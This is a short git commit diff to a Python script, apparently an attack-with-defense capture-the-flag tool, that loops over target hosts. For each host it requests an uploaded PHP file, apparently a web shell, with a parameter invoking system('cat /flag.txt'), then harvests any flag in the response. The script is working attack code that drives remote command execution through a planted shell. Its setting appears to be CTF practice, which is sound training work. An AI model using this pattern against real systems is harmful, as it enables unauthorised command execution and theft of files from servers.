670d7027099d9c3d16ec81092c97f03ca6341f4f
1651515568 <1651515568@qq.com>
2022-08-13 16:57:27 +0800

    v1.2.2.1

--- awd_tools/go.py
+++ awd_tools/go.py
@@ -12,7 +12,7 @@ payload5 = ''
 flag_list = []
 
 for i in url[1]:
-    u = i + '/uploads/abc1/20220812/62f5bf4c374cd.php?1=system(%27cat%20/flag.txt%27);'
+    u = i + '/uploads/abc1/20220812/62f5bf4c374cd.php?1=system(%27cat%20/flag.txt%27);;'
     html = requests.get(u)
     html.encoding = 'utf-8'
     if 'flag{' in html.text:
